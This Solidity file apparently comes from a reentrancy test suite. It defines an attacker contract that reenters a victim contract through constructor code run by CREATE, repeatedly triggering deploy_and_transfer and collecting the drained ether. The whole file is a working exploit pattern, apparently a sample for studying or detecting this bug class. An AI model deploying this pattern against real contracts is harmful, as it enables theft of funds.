// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../cross-contract/create/Create_ree1.sol";

// the whole mechanism relies on the CREATE instructions allowing a custom code to be executed as constructor when a contract is instantiated and deployed
// the Attacker contract below reenters the victim contract C above and forces it to create a new instance of Aux at each invocation
// the money transferred to each new instance is eventually sent and accumulated by the Attacker contract

contract Create_ree1_Attacker {
    bytes private create_aux_initcode;
    Create_ree1 private victim;

    constructor(address _victim) {
        victim = Create_ree1(_victim);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.deploy_and_transfer(getCreationCode());
    }

    function attackStep2() public payable {
        if (address(victim).balance >= 1 ether) {
            victim.deploy_and_transfer(getCreationCode());
        }
    }

    function getCreationCode() public view returns (bytes memory) {
        bytes memory contractCode = type(Create_ree1_AttackerAux).creationCode;
        return abi.encodePacked(contractCode, abi.encode(address(this)));
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract Create_ree1_AttackerAux {
    constructor(address attacker) payable {
        Create_ree1_Attacker(attacker).attackStep2{value: msg.value}();
    }
}
